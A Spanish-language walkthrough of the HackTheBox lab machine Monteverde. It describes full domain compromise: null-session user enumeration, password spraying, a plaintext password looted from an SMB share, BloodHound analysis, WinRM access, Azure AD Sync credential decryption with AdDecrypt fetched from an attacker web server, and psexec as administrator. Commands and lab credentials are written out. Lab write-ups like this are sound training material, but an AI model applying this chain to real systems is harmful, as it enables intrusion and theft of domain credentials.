![Monteverde](https://github.com/user-attachments/assets/77c9f3a7-77bc-493b-8274-7b310b176c8d)



Comenzamos realizando un escaneo de los puertos abiertos de la máquina víctima.

``sudo nmap 10.10.10.172 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250314234439](https://github.com/user-attachments/assets/46283e2f-bd66-41e8-b5d1-67c2ae549522)

Dado el output anterior podemos pensar que estamos ante un DC, pero vamos a realizar otro escaneo sobre estos puertos abiertos para saber qué versiones y servicios están corriendo.

``nmap 10.10.10.172 -sCV -p53,135,139,389,445,464,636,9389,49667,49673,49674,49693 -oN target -Pn``

![Pasted image 20250314235203](https://github.com/user-attachments/assets/bc36df1a-2c56-4015-80a9-bc4ca38d8f0e)

Podemos confirmar que estamos ante un DC y que el dominio es megabank.local

Para seguir enumerando información de la máquina, vamos a hacer uso de netexec:

``netexec smb 10.10.10.172``

![Pasted image 20250314234613](https://github.com/user-attachments/assets/f34fe504-0f36-4d4d-acc7-75cba2ea50a6)

Confirmamos que el dominio es megabank.local, que la máquina se llama Monteverde y que es un WServer 2019.

Añadimos esta información a nuestro /etc/hosts:

![Pasted image 20250314234557](https://github.com/user-attachments/assets/32e095fe-1817-4c3c-8d4a-d2d367d1943d)

Una vez sabemos esto, podemos continuar con la enumeración.

Nos conectamos por RPC con null sesion para hacer una enumeración de los usuarios existentes y nos guardamos el output en rpcusers.txt

``rpcclient -U '' 10.10.10.172 -N -c enumdomusers > rpcusers.txt``

![Pasted image 20250314234738](https://github.com/user-attachments/assets/31942378-1e9b-4320-8ffb-5c87e2f58f95)

Para generarnos un diccionario de usuarios necesitamos hacer un tratamiento de los datos. En concreto, nos quedaremos con lo que está dentro de los primeros corchetes.

``cat rpcusers.txt | cut -d '[' -f2 | cut -d ']' -f1``

![Pasted image 20250314234839](https://github.com/user-attachments/assets/9cb087d3-298c-464b-93f2-417a994d1b5d)

Una vez tenemos un listado de usuarios, podemos intentar técnicas como asreproasting. No obstante, ninguno de los usuarios tiene NoPreAuth habilitado.

Dada esta situación y que sólo tenemos un listado de usuarios, podemos probar el mismo listado de usuarios como diccionario de contraseñas..

``netexec smb 10.10.10.172 -u users.txt -p users.txt --continue-on-success``

![Pasted image 20250315000212](https://github.com/user-attachments/assets/7e2818c1-3da5-4aad-9cdf-0445a78f8646)

Nos encuentra unas credenciales válidas.
SABatchJobs:SABatchJobs 

Vamos a echar un vistazo a los recursos que se comparten con este usuario por SMB:

``netexec smb 10.10.10.172 -u 'SABatchJobs' -p 'SABatchJobs' --shares``

![Pasted image 20250315000307](https://github.com/user-attachments/assets/fb576f84-0e3c-4f8f-8150-cf407f3bbe6c)

Aparecen directorios interesantes con permisos de lectura: azure_uploads y users

Comenzamos conectándonos al directorio users y nos traemos todo el contenido:

``smbclient //10.10.10.172/users$ -U 'SABatchJobs%SABatchJobs'``

``prompt off``

``recurse on``

``mget *``

Una vez lo tenemos en la máquina víctima, miramos el contenido del archivo azure.xml:

![Pasted image 20250315000647](https://github.com/user-attachments/assets/a82c89b6-c7d9-453a-bbc0-a5ef5788e4cc)

Aparece claramente un valor en el campo de contraseña: 4n0therD4y@n0th3r

Se hace password spraying contra todos los usuarios del dominio para esta contraseña:

``netexec smb 10.10.10.172 -u users.txt -p '4n0therD4y@n0th3r$' --continue-on-success``

![Pasted image 20250315000908](https://github.com/user-attachments/assets/a9fb30c5-638f-4561-99fa-6641e78a5f6d)

Estupendo, fuunciona para mhope.

Por SMB se comparte exactamente lo mismo para mhope que para SABatchJobs.

Vamos a hacer uso de la herramienta BloodHound para enumerar más a fondo el dominio e intentar ver cositas.

Dado que el DC tiene un servidor DNS corriendo, no es necesario estar dentro de la máquina víctima y compartir SharpHound, sino que podemos hacer uso de BloodHound-Python:

``bloodhound-python -u 'mhope' -p '4n0therD4y@n0th3r$' -d megabank.local -c all -ns 10.10.10.172``

![Pasted image 20250315001530](https://github.com/user-attachments/assets/4ee679f2-a702-47c0-a4da-c651703b6d20)

Una vez hemos recolectado la data, levantamos neo4j:

``sudo neo4j start``

![Pasted image 20250315001545](https://github.com/user-attachments/assets/5e162985-9c07-4723-bd08-93d66bc2eb59)

Acto seguido levantamos BloodHound:
 
``bloodhound --no-sandbox &>/dev/null & disown``

Introducimos nuestras credenciales de neo4j en el panel de login.

Subimos los archivos .json generados previamente:

![Pasted image 20250313132148](https://github.com/user-attachments/assets/a7073b2d-dcfd-4a02-baa7-de69cc37f9d8)

![Pasted image 20250315001755](https://github.com/user-attachments/assets/9f249cca-5bd1-4ed6-bbd2-ed1cc5566ec5)

Marcamos como pwned a los dos usuarios que ya tenemos.

Ejemplo mhope:

![Pasted image 20250315001845](https://github.com/user-attachments/assets/df4fb679-a655-4b05-9d34-405a4249fc0c)

![Pasted image 20250315001858](https://github.com/user-attachments/assets/82884a2b-be62-4d7b-bd9e-4c7ccb939820)


Y repetimos para SABatchJobs.

Si vamos a la pestaña Analysis y, en concreto, "Shortest Paths To Unconstrained Delegation Systems", vemos:

![Pasted image 20250315002315](https://github.com/user-attachments/assets/dd76dd25-2ec8-4ca5-9552-eac7efd1646b)


¿Cómo? ¿Que el usuario mhope puede CanPSRemote? ¿Pero cómo? No tenemos winRM, RDP, psexec o wmiexec

A su vez:

![Pasted image 20250315114443](https://github.com/user-attachments/assets/3186c9c0-15a2-4647-a757-16f0a14b3464)


Mhope forma parte de Azure Admins.

Esto también se podía haber comprobado de otra forma desde RPCCLIENT:

- Primero nos conectamos con null sesion (aunque también podríamos hacerlo con las credenciales que tenemos de mhope)

``rpcclient -U '' 10.10.10.172 -N``

- Una vez dentro, listamos los usuarios:

``enumdomusers``

![Pasted image 20250315115325](https://github.com/user-attachments/assets/31c90ef5-60ca-4b72-8346-ed657eff3aff)

Sabemos que el RID de mhope es 0x641.

Si queremos saber en qué grupos se encuentra este usuario, podemos:

``queryusergroups 0x641``

![Pasted image 20250315115500](https://github.com/user-attachments/assets/33149c1e-4935-4c97-a232-7e94fcbfcf63)

Vale, está en los grupos 0xa29 y 0x201. Pero, ¿qué grupos son esos? También podemos averiguarlo a través de RPC.


``querygroup 0xa29``

``querygroup 0x201``

![Pasted image 20250315115553](https://github.com/user-attachments/assets/55fa0d70-ce0e-46bf-a746-948f0970d488)

Confirmamos que forma parte del grupo Azure Admins.

Después de estar viendo diferentes maneras de explotar el tener un usuario que forma parte del grupo Azure Admins, se llega a la conclusión de que necesariamente se requiere estar dentro de la máquina. No se descubren formas de hacerlo, por lo que se reinicia la máquina y se realiza un nuevo escaneo:

``sudo nmap 10.10.10.172 -sS -p- --open --min-rate 5000 -n -Pn -oG allPorts``

![Pasted image 20250315143312](https://github.com/user-attachments/assets/d1fad06a-2301-4cab-bf00-956fcc725806)

Sorprendentemente, ahora el p5985 aparece abierto. Aunque en el escaneo inicial no aparecía, se intentó probar credenciales contra winrm, resultando dichas validaciones fallidas. Cuando pasan este tipo de situaciones en las que no somos capaces de tener acceso a la máquina, puede ser realmente útil reiniciar la máquina para:

- Respirar
- Ver si hay algún servicio que no se ha levantado correctamente.

Vamos a probar las credenciales que tenemos contra winrm.

``netexec winrm 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'``

![Pasted image 20250315143629](https://github.com/user-attachments/assets/0959ce44-13dd-43d9-b95e-ebf3aacdbec7)

Tenemos pwn3d! para mhope. Vaaaaaale, podemos conectamos a la máquina víctima.

``evil-winrm -i 10.10.10.172 -u 'mhope' -p '4n0therD4y@n0th3r$'``

![Pasted image 20250315143829](https://github.com/user-attachments/assets/7c73297f-3c65-400a-97e6-52ebd1b954a8)


Estamos dentro de la máquina vícitma como mhope.

En C:\Users\mhope\Desktop encontramos la flag de usuario.

![Pasted image 20250315143940](https://github.com/user-attachments/assets/65a1ea7d-cd28-48c0-928d-6ee869147847)

# Privesc

Confirmamos que mhope forma parte del grupo Azure Admins:

![Pasted image 20250315145244](https://github.com/user-attachments/assets/f644c3d1-e4b4-4e02-b7b8-9a01b14c0584)

Hay una vía a través de la cual listar las credenciales del usuario administrador del dominio si formamos parte del grupo Azure Admins:

https://github.com/VbScrub/AdSyncDecrypt/releases

- Nos descargamos el AdDeecrypt.zip
- Lo unzipeamos -> Nos da el ejecutable y mcrypt.dll

Una vez lo tenemos en la máquina atacante se lo compartimos a la máquina víctima:

- Creamos en máquina víctima carpeta temp en C:\ -> ``mkdir C:\temp`` y nos movemos a ella.

- Abrimos http server en máquina atacante para compartir ambos archivos.

``python3 -m http.server 80``

- Hacemos solicitud de los recursos desde máquina víctima

``iwr http://10.10.14.8/AdDecrypt.exe -o AdDecrypt.exe``

``iwr http://10.10.14.8/mcrypt.dll -o mcrypt.dll``

![Pasted image 20250315145930](https://github.com/user-attachments/assets/cdc6df66-75fc-436f-84cb-12d23c8a5142)

Una vez los tenemos en máquina víctima, seguimos las instrucciones del github.

- Nos dirigimos al directorio: C:\Program Files\Microsoft Azure AD Sync\Bin y ejecutamos:
  
``C:\Temp\AdDecrypt.exe -FullSQL``

![Pasted image 20250315150238](https://github.com/user-attachments/assets/9a935a21-fe58-41ea-abbd-325b8cca655a)

Ojito con lo que tenemos.

- administrator : d0m@in4dminyeah!

Vamos a validar las credenciales con netexec:

![Pasted image 20250315150335](https://github.com/user-attachments/assets/802f4131-7544-428f-8d05-a38594ec755b)

Tenemos Pwn3d!, por lo que podemos hacer uso de wmiexec, psexec o winrm (previa validación con netexec).


``impacket-psexec administrator@10.10.10.172``

![Pasted image 20250315150746](https://github.com/user-attachments/assets/3c86e611-1a5e-48e7-b457-40b949f799e4)


Encontramos la flag de administrador en C:\Users\Administrator\Desktop:

![Pasted image 20250315150842](https://github.com/user-attachments/assets/2d0fda0d-2f5f-491b-9aaf-0b3b35d2f441)
